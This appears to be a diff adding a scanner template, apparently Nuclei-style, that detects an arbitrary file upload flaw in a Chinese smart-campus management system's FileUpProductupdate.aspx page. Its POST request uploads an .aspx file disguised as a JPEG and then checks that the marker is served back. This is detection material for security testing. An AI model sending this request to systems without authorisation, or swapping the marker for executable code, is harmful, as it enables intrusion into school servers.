@@ -1,0 +1,52 @@
+id: poc-yaml-winstaryc-fileupproductupdate-aspx-anyfile-upload
+
+info:
+  name: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    This template detects an arbitrary file upload vulnerability in 智慧校园(安校易)管理系统 FileUpProductupdate.aspx.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Module/FileUpPage/FileUpProductupdate.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----21909179191068471382830692394"
+    body: |
+      ------21909179191068471382830692394
+      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------21909179191068471382830692394--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "MD5"
+          - "update.aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Upload/Publish/000000/0_0_0_0/update.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
